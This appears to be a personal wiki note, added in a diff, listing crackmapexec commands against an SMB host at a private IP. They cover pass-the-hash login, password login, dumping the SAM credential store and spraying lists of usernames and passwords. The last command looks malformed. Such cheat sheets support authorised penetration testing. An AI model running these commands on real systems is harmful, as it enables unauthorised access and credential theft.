@@ -1,0 +1,22 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-17T14:40:40-04:00
+
+====== crackmapexec ======
+Created Sunday 17 May 2020
+
+Check SMB With Password Hash
+
+crackmapexec smb 192.168.0.24 -u UserName -H 'hash'
+
+Check SMB With Password
+crackmapexec smb 192.168.0.24 -u UserName -p 'password'
+
+Dump SAM
+
+crackmapexec smb 192.168.0.24 -u UserName -p 'password' --sam
+
+Check CrackMapExec Against a list
+
+crackmapexec 192.168.0.24 -u <user_list.txt -p '<password_list.txt>'
+
